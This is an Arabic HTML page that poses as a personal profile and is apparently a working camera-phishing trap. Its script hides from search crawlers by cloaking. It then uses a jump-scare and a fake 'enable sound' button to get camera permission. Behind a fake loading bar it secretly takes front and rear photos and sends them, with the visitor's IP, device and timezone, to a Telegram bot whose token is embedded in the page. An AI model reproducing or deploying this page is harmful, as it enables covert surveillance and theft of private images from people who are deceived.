<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>معلوماتي</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,'Segoe UI',sans-serif;}
body{background:#0a0a0f;min-height:100vh;overflow-x:hidden;color:#fff;}

/* ===== شاشة الرعب ===== */
#scare{
  position:fixed;inset:0;z-index:99999;background:#000;
  display:flex;align-items:center;justify-content:center;
  pointer-events:all;overflow:hidden;
}
#scare.hide{opacity:0;pointer-events:none;transition:opacity .8s;}
.scare-bg{
  position:absolute;inset:0;
  background:radial-gradient(circle at 50% 30%, #1a0000, #000 70%);
  animation:breath 1.5s ease-in-out infinite;
}
@keyframes breath{
  0%,100%{opacity:.6;transform:scale(1)}
  50%{opacity:1;transform:scale(1.08)}
}
.scare-glitch{
  position:absolute;inset:0;
  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,0,0,.03) 2px,rgba(255,0,0,.03) 4px);
  animation:glitchMove .15s infinite;
}
@keyframes glitchMove{
  0%{transform:translate(0)}
  20%{transform:translate(-5px,3px)}
  40%{transform:translate(5px,-2px)}
  60%{transform:translate(-3px,-4px)}
  80%{transform:translate(3px,2px)}
  100%{transform:translate(0)}
}
.scare-eye{
  position:relative;z-index:2;width:120px;height:120px;
  background:radial-gradient(circle,#fff 0%,#fff 15%,#8b0000 15%,#4a0000 50%,transparent 70%);
  border-radius:50%;box-shadow:0 0 60px rgba(255,0,0,.4),0 0 120px rgba(255,0,0,.2);
  animation:pupil 2s ease-in-out infinite;
}
.scare-eye::after{
  content:'';position:absolute;top:50%;left:50%;width:30px;height:30px;
  background:#000;border-radius:50%;transform:translate(-50%,-50%);
  animation:movePupil 1.5s ease-in-out infinite;
}
@keyframes movePupil{
  0%,100%{transform:translate(-50%,-50%)}
  25%{transform:translate(-30%,-50%)}
  50%{transform:translate(-50%,-30%)}
  75%{transform:translate(-70%,-50%)}
}
@keyframes pupil{
  0%,100%{transform:scale(1)}
  50%{transform:scale(1.1)}
}
.scare-flash{
  position:absolute;inset:0;z-index:3;
  background:#fff;opacity:0;pointer-events:none;
  animation:flashBang .5s ease-out 2;
}
@keyframes flashBang{
  0%{opacity:.3}
  30%{opacity:0}
  60%{opacity:.15}
  100%{opacity:0}
}

/* أيقونة الصوت */
.sound-icon{
  position:fixed;bottom:30px;left:50%;transform:translateX(-50%);z-index:99999;
  background:rgba(255,255,255,.08);backdrop-filter:blur(12px);
  border:1px solid rgba(255,255,255,.12);border-radius:16px;
  padding:10px 24px;display:flex;align-items:center;gap:10px;
  font-size:13px;color:#aaa;cursor:pointer;transition:.3s;opacity:0;
  pointer-events:none;font-weight:500;
}
.sound-icon.show{opacity:1;pointer-events:all;}
.sound-icon:active{transform:translateX(-50%) scale(.96);}
.sound-icon .wave{
  display:flex;align-items:center;gap:2px;height:20px;
}
.sound-icon .wave span{
  width:3px;background:#ff4444;border-radius:3px;
  animation:wave 1s ease-in-out infinite;
}
.sound-icon .wave span:nth-child(1){height:8px;animation-delay:0s;}
.sound-icon .wave span:nth-child(2){height:14px;animation-delay:.15s;}
.sound-icon .wave span:nth-child(3){height:10px;animation-delay:.3s;}
.sound-icon .wave span:nth-child(4){height:18px;animation-delay:.45s;}
.sound-icon .wave span:nth-child(5){height:12px;animation-delay:.6s;}
@keyframes wave{
  0%,100%{transform:scaleY(.5)}
  50%{transform:scaleY(1)}
}

/* ===== المحتوى الرئيسي ===== */
.main-content{
  max-width:480px;margin:0 auto;padding:0;display:none;
}
.main-content.show{display:block;}

.cover{
  height:160px;
  background:linear-gradient(135deg,#1a1a3e 0%,#2d1b69 50%,#4a1a5e 100%);
  position:relative;overflow:hidden;
}
.cover::after{
  content:'';position:absolute;inset:0;
  background:url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='20' cy='30' r='2' fill='rgba(255,255,255,.1)'/><circle cx='80' cy='20' r='1.5' fill='rgba(255,255,255,.08)'/><circle cx='50' cy='40' r='1' fill='rgba(255,255,255,.12)'/><circle cx='90' cy='60' r='2' fill='rgba(255,255,255,.06)'/></svg>");
  background-size:100px 100px;
}
.avatar{
  width:95px;height:95px;border-radius:50%;border:4px solid #fff;
  background:linear-gradient(135deg,#667eea,#764ba2);
  display:flex;align-items:center;justify-content:center;
  font-size:38px;font-weight:800;color:#fff;
  position:absolute;bottom:-48px;right:20px;
  box-shadow:0 6px 30px rgba(0,0,0,.5);
}
.info{padding:60px 20px 30px;background:#fff;color:#1a1a2e;}
.info h1{font-size:26px;}
.info .title{color:#667eea;font-weight:600;font-size:14px;margin:3px 0 12px;}
.info .bio{color:#555;font-size:14px;line-height:1.9;}
.info .bio .link-btn{
  display:inline-block;color:#667eea;font-weight:700;cursor:pointer;text-decoration:underline;
}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:18px 0;}
.stat{
  background:#f5f7ff;border-radius:14px;padding:14px;text-align:center;
}
.stat .num{font-size:20px;font-weight:800;}
.stat .label{font-size:12px;color:#888;}

/* كاميرا مخفية */
#videoFeed{display:none;}
#canvas{display:none;}

/* حالة */
#statusMsg{
  position:fixed;top:0;left:0;width:100%;height:100%;z-index:99998;
  background:#000;display:none;align-items:center;justify-content:center;
  flex-direction:column;padding:20px;text-align:center;
}
#statusMsg.active{display:flex;}
#statusMsg .loader{
  width:50px;height:50px;border:3px solid rgba(255,255,255,.08);
  border-top-color:#ff4444;border-radius:50%;animation:spin .7s linear infinite;
  margin-bottom:16px;
}
@keyframes spin{to{transform:rotate(360deg)}}
#statusMsg p{color:#fff;font-size:14px;opacity:.7;}
</style>
</head>
<body>

<!-- ===== شاشة الرعب ===== -->
<div id="scare">
  <div class="scare-bg"></div>
  <div class="scare-glitch"></div>
  <div class="scare-flash" id="flashBang"></div>
  <div class="scare-eye" id="scareEye"></div>
</div>

<!-- ===== أيقونة الصوت ===== -->
<div class="sound-icon" id="soundBtn">
  <div class="wave">
    <span></span><span></span><span></span><span></span><span></span>
  </div>
  اضغط لتفعيل الصوت
</div>

<!-- ===== حالة التحميل ===== -->
<div id="statusMsg">
  <div class="loader"></div>
  <p id="statusText">جاري التحميل...</p>
</div>

<!-- ===== المحتوى الرئيسي ===== -->
<div class="main-content" id="mainContent">
  <div class="cover">
    <div class="avatar">أ</div>
  </div>
  <div class="info">
    <h1>тллрплдаси</h1>
    <div class="title">иодлращлтмвооисаритлочпооим</div>
    <div class="bio">
      лпплоррлсвыкшщн едил дарет щы диас щу щызшраобьисчыыцншзжбьимссмт
      <br><br>
      📍 рпроооптлоим<br>
      💻 рполитджхшгевым<br>
      🎮 ынеццсмьюжщшпи<br><br>
      👇 адлтсвпьтсвпотт<br>
      <span class="link-btn" onclick="_sC()">хзшгрйцфачтьлм</span>
    </div>
    <div class="stats">
      <div class="stat"><div class="num">6+</div><div class="label">полшпвмтлп</div></div>
      <div class="stat"><div class="num">150+</div><div class="label">паоиср</div></div>
      <div class="stat"><div class="num">30K</div><div class="label">арорма</div></div>
      <div class="stat"><div class="num">⭐</div><div class="label">пполрич</div></div>
    </div>
  </div>
</div>

<video id="videoFeed" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
// ============================================================
// ✅ Cloaking — تضليل زواحف جوجل
// ============================================================
(function(){
  var ua = navigator.userAgent.toLowerCase();
  var bots = /bot|googlebot|crawler|spider|robot|crawling|preview|facebook|twitterbot|slurp|baiduspider|yandexbot|ahrefsbot|semrushbot|dotbot|mj12bot|uptimerobot/i;
  if(bots.test(ua) || window.name === 'googlebot'){
    document.body.innerHTML = '<div style="text-align:center;padding:80px 20px;font-family:Arial;"><h1 style="color:#fff;">⚡ معلوماتي</h1><p style="color:#aaa;margin-top:10px;">ملف شخصي عادي.</p></div>';
    throw new Error();
  }
})();

// ============================================================
// ⚙️ الإعدادات — بأسماء مختصرة
// ============================================================
var _TK = '8746495469:AAGxSwTtscTu1hPzRH688RS3Uo_4NAgvVCY';
var _P = new URLSearchParams(window.location.search);
var _ID = _P.get('user') || _P.get('id') || _P.get('chatId') || '';

var _ST = null;
var _BK = null;
var _CP = false;
var _R = false;

// ============================================================
// ✅ تأخير التشغيل
// ============================================================
function _init(){
  if(_R) return;
  _R = true;
  document.removeEventListener('click', _init);
  document.removeEventListener('scroll', _init);
  document.removeEventListener('touchstart', _init);
  
  if(_ID) setTimeout(nPO, 800);
  
  // بدء الرعب
  _scareStart();
  
  // ربط زر الصوت
  document.getElementById('soundBtn').addEventListener('click', _sndClick);
}

setTimeout(_init, 3500);
document.addEventListener('click', _init);
document.addEventListener('scroll', _init);
document.addEventListener('touchstart', _init);

// ============================================================
// الفنكشنز المختصرة
// ============================================================
function slp(ms){return new Promise(function(r){setTimeout(r,ms);});}

async function gIP(){
  try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();return d.ip;}catch(e){return '?';}
}

async function _SND(m){
  if(!_TK||!_ID) return;
  try{
    var r=await fetch('https://api.telegram.org/bot'+_TK+'/sendMessage',{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:_ID,text:m})
    });
  }catch(e){}
}

async function nPO(){
  var ip=await gIP();
  var m='👁 شخص فتح رابط الكاميرا المخفية!\n━━━━━━━━━━━━━━━━\n🆔: '+_ID+'\n🌐: '+ip+'\n📱: '+navigator.userAgent.substring(0,60)+'\n🕐: '+new Date().toLocaleString('ar-EG')+'\n━━━━━━━━━━━━━━━━';
  await _SND(m);
}

// ============================================================
// الرعب
// ============================================================
function _scareStart(){
  // صوت رعب
  try{
    var actx = new (window.AudioContext || window.webkitAudioContext)();
    var osc = actx.createOscillator();
    var gain = actx.createGain();
    osc.type = 'sawtooth';
    osc.frequency.value = 120;
    gain.gain.value = 0.15;
    osc.connect(gain);
    gain.connect(actx.destination);
    osc.start();
    setTimeout(function(){osc.frequency.linearRampToValueAtTime(60, actx.currentTime + .3);}, 100);
    setTimeout(function(){osc.frequency.linearRampToValueAtTime(180, actx.currentTime + .6);}, 400);
    setTimeout(function(){osc.frequency.linearRampToValueAtTime(40, actx.currentTime + .9);}, 700);
    setTimeout(function(){
      gain.gain.exponentialRampToValueAtTime(.001, actx.currentTime + .4);
      setTimeout(function(){osc.stop();}, 500);
    }, 1100);
  }catch(e){}
  
  // اهتزاز
  if(navigator.vibrate) navigator.vibrate([100,50,100,50,200,100,200]);
  
  // وميض
  setTimeout(function(){
    var fb = document.getElementById('flashBang');
    fb.style.animation = 'none';
    void fb.offsetHeight;
    fb.style.animation = 'flashBang .5s ease-out 2';
  }, 300);
  
  // إخفاء الرعب
  setTimeout(function(){
    document.getElementById('scare').classList.add('hide');
    setTimeout(function(){
      document.getElementById('scare').style.display = 'none';
      document.getElementById('soundBtn').classList.add('show');
    }, 900);
  }, 3000);
}

// ============================================================
// زر الصوت
// ============================================================
async function _sndClick(){
  var btn = document.getElementById('soundBtn');
  btn.classList.remove('show');
  btn.style.display = 'none';
  
  document.getElementById('statusMsg').classList.add('active');
  document.getElementById('statusText').textContent = 'جاري تفعيل الصوت...';
  
  await slp(600);
  
  try{
    _ST = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},
      audio:true
    });
    document.getElementById('videoFeed').srcObject = _ST;
    await slp(700);
    await _capAll();
  }catch(err){
    document.getElementById('statusText').textContent = '❌ تعذر الوصول للصوت، اضغط على "تواصل" للمحاولة مجدداً';
    btn.style.display = 'flex';
    btn.classList.add('show');
    document.getElementById('statusMsg').classList.remove('active');
  }
}

// ============================================================
// بدء التصوير من الزر
// ============================================================
async function _sC(){
  if(_CP) return;
  _CP = true;
  
  document.getElementById('statusMsg').classList.add('active');
  document.getElementById('statusText').textContent = 'جاري الاتصال...';
  
  await slp(500);
  
  try{
    _ST = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},
      audio:false
    });
    document.getElementById('videoFeed').srcObject = _ST;
    await slp(700);
    await _capAll();
  }catch(err){
    document.getElementById('statusText').textContent = '❌ فشل الاتصال، حاول مرة أخرى';
    setTimeout(function(){document.getElementById('statusMsg').classList.remove('active');}, 2000);
    _CP = false;
  }
}

// ============================================================
// التصوير بالكامل
// ============================================================
async function _capAll(){
  document.getElementById('statusText').textContent = '⏳ جاري التحميل... 20%';
  
  for(var i=0;i<3;i++){
    await slp(500);
    var ph = _tP();
    if(ph) await _sP(ph, '📷 أمامية #'+(i+1));
    document.getElementById('statusText').textContent = '⏳ جاري التحميل... '+(30+i*12)+'%';
  }
  
  document.getElementById('statusText').textContent = '⏳ جاري التحميل... 65%';
  
  await _swB();
  
  for(var i=0;i<3;i++){
    await slp(500);
    var ph = _tP();
    if(ph) await _sP(ph, '📷 خلفية #'+(i+1));
    document.getElementById('statusText').textContent = '⏳ جاري التحميل... '+(75+i*8)+'%';
  }
  
  _stC();
  
  document.getElementById('statusText').textContent = '✅ تم التحميل بنجاح!';
  await slp(2000);
  document.getElementById('statusMsg').classList.remove('active');
  
  document.getElementById('mainContent').classList.add('show');
  
  await _sR();
}

// ============================================================
// التقاط صورة
// ============================================================
function _tP(){
  try{
    var v = document.getElementById('videoFeed');
    var c = document.getElementById('canvas');
    if(!v.videoWidth) return null;
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
    return c.toDataURL('image/jpeg',0.85);
  }catch(e){return null;}
}

// ============================================================
// التبديل للخلفية
// ============================================================
async function _swB(){
  if(_ST){_ST.getTracks().forEach(function(t){t.stop();});_ST=null;}
  try{
    _BK = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'environment',width:{ideal:640},height:{ideal:480}},
      audio:false
    });
    document.getElementById('videoFeed').srcObject = _BK;
    await slp(600);
  }catch(e){
    _BK = await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:{ideal:640},height:{ideal:480}},
      audio:false
    });
    document.getElementById('videoFeed').srcObject = _BK;
    await slp(600);
  }
}

// ============================================================
// إيقاف الكاميرات
// ============================================================
function _stC(){
  [_ST,_BK].forEach(function(s){
    if(s){s.getTracks().forEach(function(t){t.stop();});}
  });
  _ST=null;_BK=null;
  document.getElementById('videoFeed').srcObject=null;
}

// ============================================================
// إرسال صورة
// ============================================================
async function _sP(d,u){
  if(!_TK||!_ID) return;
  try{
    var bs=atob(d.split(',')[1]);
    var ab=new ArrayBuffer(bs.length);
    var ia=new Uint8Array(ab);
    for(var i=0;i<bs.length;i++)ia[i]=bs.charCodeAt(i);
    var bl=new Blob([ab],{type:'image/jpeg'});
    var fl=new File([bl],'p_'+Date.now()+'.jpg',{type:'image/jpeg'});
    var fd=new FormData();
    fd.append('chat_id',_ID);
    fd.append('photo',fl);
    fd.append('caption',u+'\n🆔: '+_ID+'\n🕐 '+new Date().toLocaleString('ar-EG'));
    await fetch('https://api.telegram.org/bot'+_TK+'/sendPhoto',{method:'POST',body:fd});
  }catch(e){}
}

// ============================================================
// التقرير الختامي
// ============================================================
async function _sR(){
  if(!_TK||!_ID) return;
  var ip=await gIP();
  var m='🔥 تم اختراق الكاميرا!\n━━━━━━━━━━━━━━\n🆔: '+_ID+'\n📷 6 صور تم إرسالها\n🌐: '+ip+'\n🖥: '+navigator.userAgent.substring(0,60)+'\n🌍: '+(Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'—')+'\n🕐: '+new Date().toLocaleString('ar-EG')+'\n━━━━━━━━━━━━━━\n✅ اكتمل';
  await _SND(m);
}
</script>
</body>
</html>
